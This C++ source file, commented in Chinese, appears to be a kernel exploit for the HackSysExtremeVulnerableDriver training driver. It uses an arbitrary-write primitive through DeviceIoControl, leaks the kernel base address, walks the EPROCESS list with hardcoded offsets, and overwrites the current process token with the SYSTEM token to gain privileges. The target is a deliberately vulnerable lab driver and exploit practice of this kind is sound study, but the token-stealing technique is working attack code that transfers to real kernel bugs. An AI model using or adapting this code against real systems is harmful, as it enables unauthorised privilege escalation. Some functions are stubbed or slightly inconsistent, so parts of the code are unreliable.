#include "exploit.h"

HANDLE hDevice = NULL;

/*
* initWriteWhatWhereEnvironment:
*	[+] 初始化write-what-where的漏洞环境
* 返回值:
*	[+] True: 初始化失败
*	[+] False: 初始化成功
*/
BOOL initWriteWhatWhereEnvironment()
{
	BOOL bReturn = FALSE;
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "[+] HEVD not exist" << std::endl;
	}
	else
	{
		std::cout << "[+] Keep Go Go Go" << std::endl;
		bReturn = TRUE;
	}

	return bReturn;
}

/*
* write_what_where_dword:
*	[+] 构建一个对任意地址写入dword的机会
*	[+] UINT64 whereWriteAddress: 写入的地址
*	[+] UINT32 writeWhatValue: 写入的值
*/
VOID write_what_where_dword(UINT64 whereWriteAddress, UINT32 writeWhatValue)
{
	WRITE_WHAT_WHERE exploitStruct = {};
	PULONG_PTR whatPtr = (PULONG_PTR)&writeWhatValue;
	DWORD lpBytesReturned = 0;

	exploitStruct.Where = (PULONG_PTR)whereWriteAddress;
	exploitStruct.What = (PULONG_PTR)whatPtr;

	std::cout << "[+] write at: " << std::hex << whereWriteAddress << std::endl;
	std::cout << "[+] write with: " << std::hex << writeWhatValue << std::endl;

	// 触发漏洞函数获取write_what_where的机会
	DeviceIoControl(hDevice, WIRTE_WHAT_WHERE_IO_NUMBER, &exploitStruct, 0x10, NULL, 0, &lpBytesReturned, NULL);
}

/*
* write_what_where_qword:
*	[+] 构建一个对任意地址写入dword的机会
*	[+] UINT64 whereWriteAddress: 写入的地址
*	[+] UINT32 writeWhatValue: 写入的值
*/
VOID write_what_where_qword(UINT64 whereWriteAddress, UINT64 writeWhatValue)
{
	UINT32 lowValue = writeWhatValue;
	write_what_where_dword(whereWriteAddress, lowValue);

	UINT32 highValue = writeWhatValue >> 0x20;
	write_what_where_dword(whereWriteAddress + 0x4, highValue);
}

/*
* getCurrentProcessTokenAddress:
*	[+] 获取当前进程得Toekn地址
*/
DWORD64 getCurrentProcessTokenAddress()
{
	return 0;
}


/*
* stealToken:
*	[+] 获取system进程得Token值
*	[+] 返回值:
*			system token的值
*/
DWORD64 stealToken()
{
	// 获取NtQuerySystemIformation函数
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) 	return NULL;

	// 获取模块的信息
	DWORD len;

	// 使用NtQuerySystemInformation来获取模块长度
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

	PSYSTEM_MODULE_INFORMATION moduleInfo = NULL;
	moduleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!moduleInfo)	return NULL;

	// 获取模块信息
	NtQuerySystemInformation(SystemModuleInformation, moduleInfo, len, &len);

	// 打印出模块信息
	LPVOID kernelBase = moduleInfo->Module[0].ImageBase;
	LPVOID kernelImage = moduleInfo->Module[0].FullPathName;

	std::cout << "[+] kernel full image name: " << (char*)kernelImage << std::endl;
	std::cout << "[+] kernel base address is at: " << kernelBase << std::endl;
	// input:
	// [+] kernel full image name : \SystemRoot\system32\ntoskrnl.exe
	// [+] kernel base address is at : FFFFF8015FE77000
	
	LPCSTR lpkernelName = (LPCSTR)(moduleInfo->Module[0].FullPathName + moduleInfo->Module[0].OffsetToFileName);
	std::cout << "[+] kernel name is: " << lpkernelName << std::endl;
	// output:
	// [+] ntoskrnl.exe

	HMODULE hUserSpacekernel = LoadLibraryExA(lpkernelName, 0, 0);

	if (hUserSpacekernel == NULL)
	{
		VirtualFree(moduleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	FARPROC pUserKernelSymbol = GetProcAddress(hUserSpacekernel, "PsInitialSystemProcess");

	if (pUserKernelSymbol == NULL)
	{
		VirtualFree(moduleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	FARPROC pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpacekernel + (PUCHAR)kernelBase);

	FreeLibrary(hUserSpacekernel);
	VirtualFree(moduleInfo, 0, MEM_RELEASE);

	LPVOID lpSystemEPROCESS = NULL;
	LPVOID lpSysProcID = NULL;
	LPVOID lpSystemToken = NULL;
	LIST_ENTRY lpNextEntryAddreess = {};
	readOOB((DWORD64)pLiveFunctionAddress, &lpSystemEPROCESS, sizeof(LPVOID));
	readOOB((DWORD64)((PUCHAR)lpSystemEPROCESS + 0x2e8), &lpSysProcID, sizeof(LPVOID));
	readOOB((DWORD64)((PUCHAR)lpSystemEPROCESS + 0x358), &lpSystemToken, sizeof(LPVOID));
	readOOB((DWORD64)((PUCHAR)lpSystemEPROCESS + 0x2f0), &lpNextEntryAddreess, sizeof(LIST_ENTRY));
	// 计算出system process的地址
	std::cout << "[+] system process address is: " << lpSystemEPROCESS <<std::endl;
	std::cout << "[+] Next Process AT: " << lpNextEntryAddreess.Flink << std::endl;
	std::cout << "[+] system process token value is: "<< lpSystemToken << std::endl;
	std::cout << "[+] system process PID is: " << lpSysProcID <<  std::endl;

	DWORD64 currentProcessID = GetCurrentProcessId();

	// 计算出当前的Token值
	LPVOID lpNextEPROCESS = NULL;
	LPVOID lpCurrentPID = NULL;
	LPVOID lpCurrentToken = NULL;
	DWORD dwCurrentPID;
	do	// 根据PID是否找到当前进程 
	{
		// 获取下一个进程
		lpNextEPROCESS = (PUCHAR)lpNextEntryAddreess.Flink - 0x2f0;

		// 获取PID
		readOOB((DWORD64)((PUCHAR)lpNextEPROCESS + 0x2e8), &lpCurrentPID, sizeof(LPVOID));
		dwCurrentPID = LOWORD(lpCurrentPID);
		readOOB((DWORD64)((PUCHAR)lpNextEPROCESS + 0x2f0), &lpNextEntryAddreess, sizeof(LIST_ENTRY));
	} while (dwCurrentPID != currentProcessID);

	// 计算TOKEN值
	DWORD64 currentTokenAddress = (DWORD64)lpNextEPROCESS + 0x358;

	writeOOB(currentTokenAddress, lpSystemToken, sizeof(LPVOID));
}
/*
* runShellCode:
*	[+] 运行shellcode, 替换TOKEN
*/
VOID runShellCode()
{
	stealToken();
}

